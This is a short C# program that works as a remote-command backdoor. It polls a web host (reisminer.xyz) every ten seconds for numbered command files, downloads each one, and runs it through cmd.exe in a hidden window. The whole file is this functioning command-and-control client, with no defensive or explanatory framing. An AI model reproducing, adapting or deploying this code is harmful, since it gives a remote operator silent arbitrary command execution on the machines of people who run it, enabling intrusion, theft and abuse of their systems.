using System;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace GetCommand
{
    class Program
    {
        private static readonly WebClient wc = new WebClient();
        public static int counter = Convert.ToInt32(wc.DownloadString("http://reisminer.xyz/exes/remotecommands/counter.txt"))+1;
        public static string cmd;
        
        public static void Main(string[] args)
        {
            while (true)
            {
                if (URLExists("http://reisminer.xyz/exes/remotecommands/commands/command" + counter + ".txt"))
                {
                    Console.WriteLine("The content is: ");
                    cmd = wc.DownloadString("http://reisminer.xyz/exes/remotecommands/commands/command" + counter + ".txt");
                    Console.WriteLine(cmd);

                    runCMD(cmd);
                    
                    counter++;
                }
                else
                {
                    Console.WriteLine("it does not exist");
                }
                Thread.Sleep(10000);
            }
        }

        public static void runCMD(string command)
        {
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/c "+command;
            process.StartInfo = startInfo;
            process.Start();
        }
        public static bool URLExists(string url)
        {
            bool result = true;

            WebRequest webRequest = WebRequest.Create(url);
            webRequest.Timeout = 1200; // miliseconds
            webRequest.Method = "HEAD";

            try
            {
                webRequest.GetResponse();
            }
            catch
            {
                result = false;
            }

            return result;
        }
    }
}